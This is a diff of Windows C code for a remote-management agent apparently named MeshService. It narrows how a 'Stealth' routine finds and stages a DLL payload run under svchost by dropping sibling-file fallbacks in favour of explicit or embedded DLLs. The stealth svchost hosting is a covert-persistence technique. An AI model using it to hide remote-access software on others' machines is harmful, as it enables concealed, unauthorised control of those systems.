@@ -5215,9 +5215,6 @@ cleanup:
 
 static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, const wchar_t* destPath)
 {
-    wchar_t candidatePath[MAX_PATH * 4] = {0};
-    wchar_t brandedCandidatePath[MAX_PATH * 4] = {0};
-    wchar_t brandedDllName[MAX_PATH] = {0};
     BOOL packageProvided = (sourceExePath != NULL && sourceExePath[0] != L'\0');
 
     if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
@@ -5232,13 +5229,6 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
 
     if (packageProvided)
     {
-        if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".dll", candidatePath, _countof(candidatePath)) &&
-            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(candidatePath, sourceDllPath) != 0) &&
-            Stealth_TryStageAndValidateSvchostDll(candidatePath, destPath, L"package same-basename DLL"))
-        {
-            return TRUE;
-        }
-
         Stealth_DeleteFileIfPresent(destPath);
         if (Stealth_ExtractEmbeddedSvchostDllFromExe(sourceExePath, destPath))
         {
@@ -5255,25 +5245,8 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
             Stealth_DeleteFileIfPresent(destPath);
         }
 
-        MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), brandedDllName, _countof(brandedDllName));
-        if (brandedDllName[0] != L'\0' &&
-            Stealth_BuildSiblingPathWithFileName(sourceExePath, brandedDllName, brandedCandidatePath, _countof(brandedCandidatePath)) &&
-            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(brandedCandidatePath, sourceDllPath) != 0) &&
-            Stealth_TryStageAndValidateSvchostDll(brandedCandidatePath, destPath, L"package sibling branded DLL"))
-        {
-            return TRUE;
-        }
-
-        if (Stealth_BuildSiblingPathWithFileName(sourceExePath, STEALTH_FALLBACK_DLL_NAME, candidatePath, _countof(candidatePath)) &&
-            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(candidatePath, sourceDllPath) != 0) &&
-            (brandedCandidatePath[0] == L'\0' || _wcsicmp(candidatePath, brandedCandidatePath) != 0) &&
-            Stealth_TryStageAndValidateSvchostDll(candidatePath, destPath, L"package sibling fallback DLL"))
-        {
-            return TRUE;
-        }
-
         Stealth_DeleteFileIfPresent(destPath);
-        Stealth_LogInstallEvent(L"Package did not provide a valid svchost DLL payload (%ls)", sourceExePath);
+        Stealth_LogInstallEvent(L"Package did not provide a valid explicit or embedded svchost DLL payload (%ls)", sourceExePath);
         return FALSE;
     }
 
